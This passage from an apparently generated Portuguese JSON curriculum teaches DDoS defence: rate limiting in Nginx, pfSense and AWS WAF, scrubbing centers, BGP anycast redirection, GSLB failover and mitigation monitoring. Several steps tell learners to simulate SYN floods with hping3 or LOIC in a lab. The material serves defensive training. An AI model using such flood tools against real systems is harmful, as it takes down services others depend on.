                                    "Documente configuração em README ou Ansible playbook.",
                                    "Teste cenários edge: bots legítimos, CDN.",
                                    "Backup configuração e planeje rollout para produção."
                                  ],
                                  "verification": "Sistema monitorado gera alertas em floods; documentação permite replicação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Prometheus/Node Exporter",
                                    "Git para versionamento",
                                    "Fail2ban opcional"
                                  ],
                                  "tips": "Use Lua scripts no Nginx para limites dinâmicos; considere geo-blocking.",
                                  "learningObjective": "Garantir sustentabilidade e escalabilidade da implementação de rate limiting.",
                                  "commonMistakes": [
                                    "Não documentar mudanças",
                                    "Ignorar custos de monitoramento",
                                    "Overfitting para testes específicos"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um blog WordPress em Nginx local. Use siege para simular 100 usuários acessando /wp-login.php simultaneamente. Verifique que IPs floods são limitados a 10 req/s, protegendo contra brute-force login durante pico de tráfego.",
                              "finalVerifications": [
                                "Servidor responde <200ms para tráfego normal.",
                                "Requisições acima do rate retornam 429/503 com headers apropriados.",
                                "Logs registram todos os bloqueios com IP e timestamp.",
                                "Nenhum impacto em performance para bursts iniciais (burst handling).",
                                "Testes com múltiplos IPs confirmam limitação por IP.",
                                "Configuração persiste após restart do serviço.",
                                "Ferramentas de monitoramento mostram redução em picos de tráfego malicioso."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta sem erros de sintaxe (nginx -t / apachectl configtest).",
                                "Rate limiting aplicado seletivamente por IP/location.",
                                "Evidência de testes com ferramentas (screenshots/logs de ab/siege).",
                                "Ajustes baseados em análise de resultados.",
                                "Documentação completa com comandos usados.",
                                "Integração básica de logs/monitoramento."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender protocolos HTTP e headers de rate limiting (RFC 6585).",
                                "Programação: Scripts Lua/Perl para limites dinâmicos no Nginx.",
                                "DevOps: Automatização com Ansible/Docker para deploy.",
                                "Análise de Dados: Métricas de logs com ELK Stack.",
                                "Ética em Cibersegurança: Balancear proteção vs. usabilidade usuário."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon ou bancos online, rate limiting previne DDoS em endpoints críticos como login/checkout, mantendo disponibilidade 99.9% durante ataques volumétricos de bots."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.3",
                            "name": "Configurar rate limiting em firewalls",
                            "description": "Aplicar políticas de rate limiting em dispositivos como pfSense ou AWS WAF, definindo thresholds para SYN floods e monitorando via logs em tempo real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar Políticas de Rate Limiting",
                                  "subSteps": [
                                    "Identifique os tipos de ataques alvo, como SYN floods.",
                                    "Defina thresholds realistas: ex. 100 SYN por minuto por IP.",
                                    "Determine escopo: portas específicas (ex. 80/443) ou toda rede.",
                                    "Documente regras: ações (drop, reject) e exceções para IPs confiáveis."
                                  ],
                                  "verification": "Documento de planejamento criado com thresholds e escopos definidos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação pfSense/AWS WAF",
                                    "Ferramentas de planejamento (Notion/Google Docs)"
                                  ],
                                  "tips": "Comece com thresholds conservadores para evitar falsos positivos.",
                                  "learningObjective": "Entender componentes de uma política de rate limiting eficaz.",
                                  "commonMistakes": [
                                    "Definir thresholds muito baixos bloqueando tráfego legítimo",
                                    "Ignorar exceções para IPs internos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Rate Limiting Básico no pfSense",
                                  "subSteps": [
                                    "Acesse interface web do pfSense (https://IP).",
                                    "Vá para Firewall > Tables e crie tabela para IPs.",
                                    "Em Firewall > Rules, adicione regra com 'max-src-conn' e 'max-src-conn-rate'.",
                                    "Aplique a regra em WAN ou interface relevante."
                                  ],
                                  "verification": "Regra aparece na lista de firewall rules e está habilitada.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VM ou appliance pfSense instalada",
                                    "Acesso admin ao pfSense"
                                  ],
                                  "tips": "Use 'pfctl -t table_name -T show' no shell para verificar tabela.",
                                  "learningObjective": "Implementar regras básicas de limitação de conexões no pfSense.",
                                  "commonMistakes": [
                                    "Esquecer de salvar e aplicar mudanças",
                                    "Colocar regra em ordem incorreta (antes de allow rules)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Thresholds para SYN Floods e AWS WAF Alternativa",
                                  "subSteps": [
                                    "No pfSense, ajuste 'state-policy' para SYN com limites (ex. synproxy).",
                                    "Crie regra específica: limitar SYN packets com 'max-src-states'.",
                                    "Para AWS WAF: Crie Web ACL, adicione Rate-based rule (ex. 2000 req/5min).",
                                    "Associe ACL a recursos (ALB, CloudFront)."
                                  ],
                                  "verification": "Regras SYN configuradas e associadas corretamente no pfSense/AWS console.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Conta AWS com WAF",
                                    "Console pfSense shell para pf.conf"
                                  ],
                                  "tips": "Teste thresholds com hping3 antes de produção.",
                                  "learningObjective": "Aplicar limites específicos para floods SYN em firewalls.",
                                  "commonMistakes": [
                                    "Não habilitar synproxy causando overhead alto",
                                    "Definir rates muito altos permitindo floods"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Monitoramento via Logs em Tempo Real",
                                  "subSteps": [
                                    "Habilite logging nas regras de rate limiting (Firewall > Rules > Log).",
                                    "Configure Status > System Logs > Firewall para filtro de rate limit.",
                                    "Instale/integre ferramentas como ELK ou Splunk para logs realtime.",
                                    "Crie alertas para thresholds excedidos."
                                  ],
                                  "verification": "Logs mostram entradas de rate limiting ao simular tráfego.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramentas de log: pfTop, AWS CloudWatch"
                                  ],
                                  "tips": "Use 'pfctl -f /etc/pf.conf' para reload sem restart.",
                                  "learningObjective": "Monitorar efetividade do rate limiting via logs.",
                                  "commonMistakes": [
                                    "Logs não habilitados nas regras",
                                    "Ignorar falsos positivos nos alertas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar a Configuração",
                                  "subSteps": [
                                    "Simule SYN flood com hping3 ou LOIC (controle ambiente).",
                                    "Monitore logs e contadores de estados (pfctl -s states).",
                                    "Verifique tráfego legítimo não é afetado.",
                                    "Ajuste thresholds baseado em resultados."
                                  ],
                                  "verification": "Flood mitigado, serviço online, logs confirmam ações.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas de teste: hping3, nmap",
                                    "Servidor alvo (ex. Apache)"
                                  ],
                                  "tips": "Use múltiplos IPs para teste distribuído.",
                                  "learningObjective": "Validar configuração contra ataques simulados.",
                                  "commonMistakes": [
                                    "Testar em produção",
                                    "Não restaurar após testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com pfSense protegendo um servidor web Apache, configure rate limiting para 100 SYN/min/IP na porta 80. Simule flood com hping3 de outro host e verifique logs.",
                              "finalVerifications": [
                                "Rate limiting ativa sem derrubar serviço legítimo.",
                                "Logs registram ações de drop/reject em floods.",
                                "Thresholds ajustados baseados em testes.",
                                "Monitoramento realtime funcional com alertas."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta de regras e tables (sem erros de sintaxe).",
                                "Thresholds apropriados para SYN floods (100-500/min).",
                                "Logs interpretados corretamente com evidências.",
                                "Testes mostram mitigação efetiva (>90% drop de flood)."
                              ],
                              "crossCurricularConnections": [
                                "Networking: Entender handshakes TCP SYN.",
                                "Cloud Computing: Integração AWS WAF com serviços serverless.",
                                "Monitoramento: Análise de logs com SIEM tools.",
                                "Desenvolvimento: Scripting de automação de regras via API."
                              ],
                              "realWorldApplication": "Proteger e-commerces de DDoS durante Black Friday, limitando bots maliciosos enquanto permite picos legítimos de usuários, reduzindo custos de escalonamento e downtime."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.3",
                        "name": "Serviços de Scrubbing",
                        "description": "Serviços terceirizados ou centros de limpeza que redirecionam tráfego para análise em nuvem, removendo pacotes maliciosos antes de encaminhar o tráfego limpo ao destino.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.3.1",
                            "name": "Entender o funcionamento de scrubbing centers",
                            "description": "Descrever o fluxo BGP para redirecionamento de tráfego (anycast), processos de scrubbing em escala e provedores como Cloudflare, Akamai ou AWS Shield.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Scrubbing Centers",
                                  "subSteps": [
                                    "Defina scrubbing centers como instalações especializadas que filtram tráfego malicioso de DDoS antes de encaminhá-lo para a infraestrutura protegida.",
                                    "Explique o papel dos scrubbing centers na mitigação de DDoS: absorver e analisar tráfego em escala massiva.",
                                    "Diferencie scrubbing centers de soluções on-premise: eles usam capacidade dedicada e hardware de alta performance.",
                                    "Identifique componentes chave: roteadores de borda, clusters de análise de tráfego e sistemas de limpeza.",
                                    "Descreva o benefício principal: proteção sem impacto no tráfego legítimo."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo o que é um scrubbing center e seu propósito principal, citando pelo menos 3 componentes chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação oficial de Cloudflare sobre scrubbing",
                                    "Vídeo introdutório no YouTube sobre mitigação DDoS"
                                  ],
                                  "tips": "Use analogias como 'um filtro de água gigante' para visualizar o processo de limpeza de tráfego.",
                                  "learningObjective": "Dominar a definição e componentes básicos de scrubbing centers.",
                                  "commonMistakes": "Confundir scrubbing centers com CDNs genéricas; lembre-se que o foco é mitigação DDoS específica."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Fluxo BGP e Anycast para Redirecionamento de Tráfego",
                                  "subSteps": [
                                    "Explique BGP (Border Gateway Protocol) como protocolo de roteamento que anuncia prefixos IP.",
                                    "Descreva anycast: múltiplos servidores com o mesmo IP, roteados para o mais próximo via BGP.",
                                    "Detalhe o fluxo: durante DDoS, anunciar prefixo anycast via BGP para redirecionar tráfego ao scrubbing center.",
                                    "Ilustre o processo reverso: após scrubbing, tráfego limpo é reenviado via BGP para origem.",
                                    "Discuta blackholing como alternativa: descartar tráfego malicioso em vez de scrub."
                                  ],
                                  "verification": "Desenhe um diagrama simples do fluxo BGP anycast (entrada DDoS -> scrubbing -> saída limpa) e anote 3 vantagens do anycast.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como draw.io",
                                    "RFC 1998 sobre BGP Communities para blackholing"
                                  ],
                                  "tips": "Monitore anúncios BGP reais usando ferramentas como Hurricane Electric BGP Toolkit para ver anycast em ação.",
                                  "learningObjective": "Entender como BGP e anycast habilitam redirecionamento dinâmico de tráfego para scrubbing.",
                                  "commonMistakes": "Ignorar latência introduzida pelo redirecionamento; anycast minimiza isso com roteamento próximo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Processos de Scrubbing em Escala",
                                  "subSteps": [
                                    "Descreva inspeção inicial: análise de volume, padrões de pacotes e heurísticas para DDoS.",
                                    "Explique técnicas de scrubbing: rate limiting, SYN proxy, DNS rate limiting e ML para detecção avançada.",
                                    "Detalhe escalabilidade: uso de hardware ASICs, clusters distribuídos e capacidade de Tbps.",
                                    "Aborde o pipeline: classificação -> filtragem -> normalização -> forwarding de tráfego limpo.",
                                    "Discuta desafios: falsos positivos e overhead de processamento."
                                  ],
                                  "verification": "Liste 4 técnicas de scrubbing com uma breve explicação de cada e como elas escalam para ataques de 100Gbps+.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Whitepaper da Akamai sobre scrubbing",
                                    "Simulador de tráfego como Wireshark para pacotes DDoS"
                                  ],
                                  "tips": "Pense em scrubbing como uma 'linha de montagem' industrial para pacotes de rede.",
                                  "learningObjective": "Mapear o pipeline completo de scrubbing e suas técnicas escaláveis.",
                                  "commonMistakes": "Subestimar a necessidade de estado stateless em escala; scrubbing usa métodos sem estado quando possível."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar Provedores de Scrubbing: Cloudflare, Akamai e AWS Shield",
                                  "subSteps": [
                                    "Analise Cloudflare Magic Transit: BGP anycast integrado com scrubbing global.",
                                    "Descreva Akamai Prolexic: scrubbing centers dedicados com capacidade de 20+ Tbps.",
                                    "Explique AWS Shield Advanced: integração nativa com VPC e detecção automatizada via ML.",
                                    "Compare métricas: latência, cobertura geográfica, integração com nuvem e custo.",
                                    "Identifique casos de uso: Cloudflare para apps web, Akamai para enterprises, AWS para workloads cloud."
                                  ],
                                  "verification": "Crie uma tabela comparativa com 3 colunas (provedor) e 4 linhas (BGP anycast, capacidade, integração, custo aproximado).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Sites oficiais: cloudflare.com/ddos, akamai.com/prolexic, aws.amazon.com/shield"
                                  ],
                                  "tips": "Verifique status pages desses provedores durante incidentes reais para ver scrubbing em ação.",
                                  "learningObjective": "Diferenciar capacidades e fluxos de principais provedores de scrubbing.",
                                  "commonMistakes": "Generalizar todos como idênticos; cada um otimiza para cenários específicos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar Conhecimento em Fluxo Completo de Mitigação",
                                  "subSteps": [
                                    "Monte o fluxo end-to-end: detecção DDoS -> anúncio BGP -> scrubbing -> reanúncio -> monitoramento pós-ataque.",
                                    "Simule cenários: volumetric DDoS vs. application-layer e como scrubbing adapta.",
                                    "Discuta automação: APIs para trigger scrubbing e dashboards para visibilidade.",
                                    "Avalie trade-offs: custo vs. eficácia e dependência de terceiros.",
                                    "Planeje testes: usar plataformas como AWS GameDay para simular DDoS."
                                  ],
                                  "verification": "Escreva um relatório de 1 página descrevendo o fluxo completo para um ataque hipotético de 500Gbps.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas de simulação DDoS como AWS Shield test tools"
                                  ],
                                  "tips": "Use fluxogramas para visualizar o end-to-end e identificar gargalos potenciais.",
                                  "learningObjective": "Sintetizar todos os elementos em um fluxo operacional coeso.",
                                  "commonMistakes": "Esquecer monitoramento contínuo pós-scrubbing para ataques persistentes."
                                }
                              ],
                              "practicalExample": "Imagine um site de e-commerce sofrendo um ataque volumetric DDoS de 200Gbps. O time ativa Cloudflare Magic Transit: anuncia o prefixo IP via BGP anycast para o scrubbing center mais próximo. O tráfego é inspecionado, pacotes maliciosos (UDP floods) filtrados via rate limiting e ML, e o tráfego limpo (HTTPS legítimo) reenviado em <50ms, mantendo 99.9% uptime.",
                              "finalVerifications": [
                                "Desenhe e explique o diagrama BGP anycast para scrubbing.",
                                "Liste 5 técnicas de scrubbing e seus alvos (ex: SYN flood).",
                                "Compare 2 provedores em termos de capacidade e integração.",
                                "Simule um fluxo end-to-end para um ataque application-layer.",
                                "Identifique 3 desafios de escalabilidade em scrubbing centers.",
                                "Explique como evitar falsos positivos em scrubbing."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do fluxo BGP anycast (80% cobertura).",
                                "Detalhe técnico das técnicas de scrubbing (mínimo 4 exemplos corretos).",
                                "Comparação válida entre provedores com métricas reais.",
                                "Diagrama claro e completo do pipeline end-to-end.",
                                "Identificação de trade-offs e desafios realistas.",
                                "Uso correto de terminologia (ex: blackholing vs. scrubbing).",
                                "Aplicação prática em cenários hipotéticos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Profundidade em BGP e roteamento anycast.",
                                "Machine Learning: Uso de ML para detecção avançada de DDoS em scrubbing.",
                                "Gestão de Projetos: Planejamento de integração de serviços de terceiros como AWS Shield.",
                                "Análise de Dados: Monitoramento e métricas de tráfego pós-scrubbing.",
                                "Ética em Cibersegurança: Considerações de privacidade em análise de tráfego."
                              ],
                              "realWorldApplication": "Empresas como bancos (ex: JPMorgan usa Akamai) ou plataformas de streaming (Netflix com Cloudflare) ativam scrubbing centers durante ataques estatais ou botnets, garantindo continuidade de negócios e evitando perdas milionárias por hora de downtime."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.2",
                            "name": "Configurar integração com serviços de scrubbing",
                            "description": "Implementar anúncios BGP para roteamento de tráfego para um scrubbing service, configurando GSLB (Global Server Load Balancing) e testando failover.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejamento e Preparação do Ambiente de Rede",
                                  "subSteps": [
                                    "Pesquise e selecione um provedor de scrubbing service compatível (ex: Cloudflare Magic Transit, Akamai Prolexic).",
                                    "Reúna credenciais BGP (AS number, peer IPs) e detalhes do scrubbing service (prefixos de destino, anycast IPs).",
                                    "Documente a topologia atual da rede, identificando roteadores de borda e fluxos de tráfego críticos.",
                                    "Configure autenticação BGP (MD5 ou similar) e políticas básicas de roteamento.",
                                    "Crie um diagrama de fluxo de tráfego normal vs. mitigação DDoS."
                                  ],
                                  "verification": "Diagrama completo e credenciais testadas com ping/telnet aos peers BGP.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Documentação do scrubbing service",
                                    "Acesso administrativo a roteadores Cisco/Juniper",
                                    "Ferramentas de diagramação como draw.io",
                                    "Calculadora de prefixos IP"
                                  ],
                                  "tips": [
                                    "Comece com ambiente de lab usando GNS3 ou EVE-NG para simulação segura.",
                                    "Verifique compatibilidade de BGP versão 4 com add-paths para múltiplos paths."
                                  ],
                                  "learningObjective": "Entender os pré-requisitos de integração BGP e mapear topologia para mitigação DDoS.",
                                  "commonMistakes": [
                                    "Ignorar autenticação BGP levando a hijacks.",
                                    "Usar prefixos incorretos causando blackholing acidental.",
                                    "Subestimar latência de scrubbing centers."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementação de Anúncios BGP para Roteamento de Tráfego",
                                  "subSteps": [
                                    "Configure peers BGP nos roteadores de borda com o scrubbing service.",
                                    "Crie políticas de prefix-list para anunciar prefixos originados para o scrubbing durante ataques.",
                                    "Implemente comunidades BGP para tagging de tráfego DDoS (ex: no-export para scrubbing).",
                                    "Aplique route-maps para prepend AS paths ou local-preference para priorizar scrubbing paths.",
                                    "Monitore anúncios com 'show ip bgp' e valide com ferramentas externas como BGP looking glasses."
                                  ],
                                  "verification": "Prefixos são anunciados corretamente para o scrubbing service via 'show ip bgp neighbors' e Hurricane Electric BGP toolkit.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Roteadores com BGP habilitado",
                                    "Documentação BGP do fornecedor (Cisco IOS/NX-OS)",
                                    "Ferramentas de monitoramento como BGPmon ou bgp.he.net"
                                  ],
                                  "tips": [
                                    "Use conditional advertisements para anunciar scrubbing paths apenas sob trigger DDoS.",
                                    "Teste withdraw de anúncios para retorno ao tráfego normal."
                                  ],
                                  "learningObjective": "Dominar configuração BGP para redirecionamento dinâmico de tráfego de ataque.",
                                  "commonMistakes": [
                                    "Anúncios prematuros causando perda de tráfego legítimo.",
                                    "Loops de roteamento por falta de AS-path filtering.",
                                    "Ignorar maximum-prefix para proteção contra overload."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configuração de GSLB para Balanceamento e Failover",
                                  "subSteps": [
                                    "Integre GSLB no scrubbing service (ex: F5 Big-IP DNS ou AWS Route 53 com health checks).",
                                    "Defina pools de scrubbing centers com métricas de saúde (latência, disponibilidade).",
                                    "Configure DNS records anycast para GSLB e políticas de failover (active-active ou active-passive).",
                                    "Implemente health monitors para scrubbing nodes (HTTP/TCP probes).",
                                    "Teste balanceamento com dig/nslookup simulando falhas em um centro."
                                  ],
                                  "verification": "GSLB responde com IPs corretos de scrubbing centers e failover automático em simulação de falha.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Plataforma GSLB (F5, Citrix NetScaler)",
                                    "Ferramentas DNS como dig e nslookup",
                                    "Simulador de falhas como Chaos Monkey"
                                  ],
                                  "tips": [
                                    "Priorize scrubbing centers geograficamente próximos para minimizar latência.",
                                    "Use TTL baixo em DNS para failover rápido."
                                  ],
                                  "learningObjective": "Configurar GSLB para alta disponibilidade em serviços de scrubbing distribuídos.",
                                  "commonMistakes": [
                                    "Health checks muito agressivos causando flapping.",
                                    "DNS TTL alto atrasando failover.",
                                    "Falta de geolocalização ignorando regulamentações de dados."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testes de Failover e Validação Completa",
                                  "subSteps": [
                                    "Simule ataque DDoS com ferramentas como hping3 ou LOIC em ambiente lab.",
                                    "Monitore redirecionamento de tráfego via NetFlow/sFlow e logs do scrubbing service.",
                                    "Teste failover GSLB desligando um scrubbing center e verificando continuidade.",
                                    "Valide limpeza de tráfego com análise de pacotes (Wireshark) pré/pós-scrubbing.",
                                    "Documente métricas de desempenho (latência, taxa de mitigação) e crie playbook de produção."
                                  ],
                                  "verification": "Tráfego DDoS é mitigado com >95% eficácia e failover em <60s sem perda de serviço.",
                                  "estimatedTime": "4-5 horas",
                                  "materials": [
                                    "Ferramentas de geração de tráfego DDoS simulada (hping3, Apache Benchmark)",
                                    "Wireshark/tcpdump",
                                    "Dashboard do scrubbing service"
                                  ],
                                  "tips": [
                                    "Use canary traffic (pequeno % de tráfego real) em testes de produção.",
                                    "Automatize testes com scripts Ansible/Python."
                                  ],
                                  "learningObjective": "Validar end-to-end a integração para resiliência contra DDoS reais.",
                                  "commonMistakes": [
                                    "Testes sem escala real subestimando volume de ataque.",
                                    "Falta de rollback plan após testes.",
                                    "Ignorar falsos positivos em detecção DDoS."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce sofrendo DDoS de 10Gbps em seu IP principal (192.0.2.0/24), configure BGP para anunciar o prefixo ao scrubbing service da Cloudflare. GSLB balanceia entre centros em EUA e Europa, com failover automático se um centro falhar, limpando tráfego malicioso e retornando limpo via túnel GRE/IPIP.",
                              "finalVerifications": [
                                "Anúncios BGP propagam corretamente para scrubbing sem vazamento.",
                                "GSLB failover ocorre em menos de 60 segundos com zero downtime.",
                                "Tráfego DDoS simulado é roteado, limpo e retornado com latência <100ms adicional.",
                                "Monitoramento mostra mitigação >95% de pacotes maliciosos.",
                                "Playbook documentado permite ativação manual/emergência.",
                                "Testes repetidos confirmam consistência em múltiplos cenários."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração BGP (sem erros de sintaxe ou loops).",
                                "Eficácia do GSLB em balanceamento e health checks.",
                                "Sucesso em testes de failover e mitigação DDoS.",
                                "Documentação completa com diagramas e métricas.",
                                "Identificação e correção de erros comuns durante testes.",
                                "Otimização de latência e políticas de roteamento."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos BGP e anycast routing.",
                                "Cloud Computing: Integração com serviços como AWS Shield ou Azure DDoS Protection.",
                                "Segurança de Rede: Detecção e resposta a DDoS com SIEM.",
                                "DevOps: Automação de configurações com Ansible/Terraform.",
                                "Análise de Dados: Monitoramento com ELK Stack ou Splunk."
                              ],
                              "realWorldApplication": "Provedores de internet e empresas como Google, Netflix usam scrubbing com BGP/GSLB para mitigar DDoS em escala Tbps, garantindo disponibilidade de serviços críticos durante ataques estatais ou criminosos."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.3",
                            "name": "Monitorar e otimizar scrubbing",
                            "description": "Analisar dashboards de serviços de scrubbing para ajustar regras de mitigação, correlacionar logs com ataques reais e avaliar latência pós-limpeza.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Acessar e interpretar dashboards de serviços de scrubbing",
                                  "subSteps": [
                                    "Faça login no painel de controle do serviço de scrubbing (ex: Cloudflare, Akamai).",
                                    "Navegue até a seção de dashboards de DDoS/scrubbing e identifique métricas chave como tráfego total, tráfego mitigado e taxa de mitigação.",
                                    "Configure alertas personalizados para picos de tráfego suspeito.",
                                    "Exporte relatórios iniciais para baseline de performance.",
                                    "Anote padrões normais de tráfego para comparação futura."
                                  ],
                                  "verification": "Dashboard acessado com visualização de métricas em tempo real e baseline estabelecida documentada.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso ao serviço de scrubbing",
                                    "Navegador web",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use filtros de tempo para comparar horários de pico e use zoom em gráficos para detalhes finos.",
                                  "learningObjective": "Compreender a interface e métricas principais de dashboards de scrubbing.",
                                  "commonMistakes": [
                                    "Ignorar configurações regionais de tráfego",
                                    "Não estabelecer baseline inicial",
                                    "Confundir tráfego legítimo com malicioso sem análise"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e correlacionar logs com ataques reais",
                                  "subSteps": [
                                    "Acesse os logs de scrubbing e filtre por eventos de mitigação ativa.",
                                    "Correlacione timestamps de logs com relatórios de incidentes de segurança (SIEM ou tickets).",
                                    "Identifique assinaturas de ataques (ex: SYN flood, UDP amplification) usando ferramentas de query.",
                                    "Crie visualizações de correlação (gráficos de tempo/série) para mapear ataque vs. mitigação.",
                                    "Documente anomalias como volume de pacotes descartados ou IPs fontes recorrentes."
                                  ],
                                  "verification": "Relatório de correlação gerado com pelo menos 3 exemplos de ataques mapeados a logs.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Logs de scrubbing",
                                    "Ferramenta SIEM (ex: Splunk, ELK)",
                                    "Planilha para mapeamento"
                                  ],
                                  "tips": "Use queries regex para padrões de ataque conhecidos; priorize logs de alta severidade.",
                                  "learningObjective": "Desenvolver habilidades para correlacionar dados de logs com eventos de segurança reais.",
                                  "commonMistakes": [
                                    "Não sincronizar fusos horários",
                                    "Sobrecarregar análise com logs irrelevantes",
                                    "Ignorar falsos positivos em correlações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Ajustar regras de mitigação baseadas na análise",
                                  "subSteps": [
                                    "Revise regras existentes e identifique gaps com base na análise de logs.",
                                    "Crie ou edite regras (ex: rate limiting por IP, geoblocking, challenge pages).",
                                    "Teste regras em modo simulação ou staging para validar eficácia.",
                                    "Aplique regras em produção e monitore impacto imediato no dashboard.",
                                    "Registre mudanças em um change log com justificativa e métricas pré/pós."
                                  ],
                                  "verification": "Pelo menos 2 regras ajustadas aplicadas e impacto inicial monitorado sem downtime.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Painel de regras do serviço",
                                    "Ambiente de teste/staging",
                                    "Documentação de regras"
                                  ],
                                  "tips": "Comece com regras conservadoras para evitar bloqueio de tráfego legítimo; use A/B testing se disponível.",
                                  "learningObjective": "Aprender a configurar e otimizar regras de mitigação de forma iterativa.",
                                  "commonMistakes": [
                                    "Regras muito agressivas causando falsos positivos",
                                    "Não testar antes de produção",
                                    "Falta de documentação de mudanças"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar latência pós-limpeza e otimizar continuamente",
                                  "subSteps": [
                                    "Meça latência end-to-end (cliente-servidor) pré e pós-scrubbing usando ferramentas como ping ou traceroute.",
                                    "Compare métricas de performance (throughput, latência média) no dashboard.",
                                    "Ajuste configurações de scrubbing (ex: anycast routing, cache levels) para minimizar overhead.",
                                    "Configure monitoramento automatizado de latência com thresholds de alerta.",
                                    "Gere relatório final com KPIs otimizados e plano de revisão semanal."
                                  ],
                                  "verification": "Relatório de latência gerado mostrando redução ou estabilidade, com automações configuradas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de medição de rede (ex: iperf, Wireshark)",
                                    "Dashboard de performance",
                                    "Script de monitoramento"
                                  ],
                                  "tips": "Foquem em latência P95/P99 para cenários reais; integre com APM se disponível.",
                                  "learningObjective": "Avaliar impacto de scrubbing na performance e implementar otimizações contínuas.",
                                  "commonMistakes": [
                                    "Medir apenas latência média ignorando caudas",
                                    "Não considerar roteamento BGP",
                                    "Otimizar sem baseline de comparação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um ataque DDoS SYN flood de 10Gbps contra um e-commerce, acesse o dashboard Cloudflare, correlacione logs com picos de tráfego, ajuste rate limiting para 100 req/s por IP, aplique e verifique redução de 95% no tráfego malicioso com latência estável em <200ms.",
                              "finalVerifications": [
                                "Dashboard mostra taxa de mitigação >90% durante simulação de ataque.",
                                "Logs correlacionados com 100% de precisão para eventos testados.",
                                "Latência pós-scrubbing dentro de 10% do baseline normal.",
                                "Regras ajustadas documentadas e testadas sem falsos positivos.",
                                "Relatório final com KPIs e plano de otimização gerado.",
                                "Alertas configurados e testados com resposta em <5min."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de dashboards (métricas corretas identificadas).",
                                "Qualidade da correlação de logs (exemplos válidos e documentados).",
                                "Eficácia das regras ajustadas (redução de tráfego malicioso sem impacto em legítimo).",
                                "Análise quantitativa de latência (métricas pré/pós comparadas).",
                                "Documentação completa e acionável.",
                                "Capacidade de otimização iterativa demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de queries e visualizações em logs.",
                                "Redes: Entendimento de protocolos de ataque e roteamento BGP.",
                                "Gestão de Incidentes: Integração com SIEM e response plans.",
                                "Estatística: Métricas de performance e thresholds.",
                                "Automação: Scripts para monitoramento contínuo."
                              ],
                              "realWorldApplication": "Em provedores como AWS Shield ou Cloudflare, equipes de SOC usam isso para mitigar ataques reais, mantendo SLAs de uptime >99.99% e minimizando custos de scrubbing durante blackholing evitado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.4",
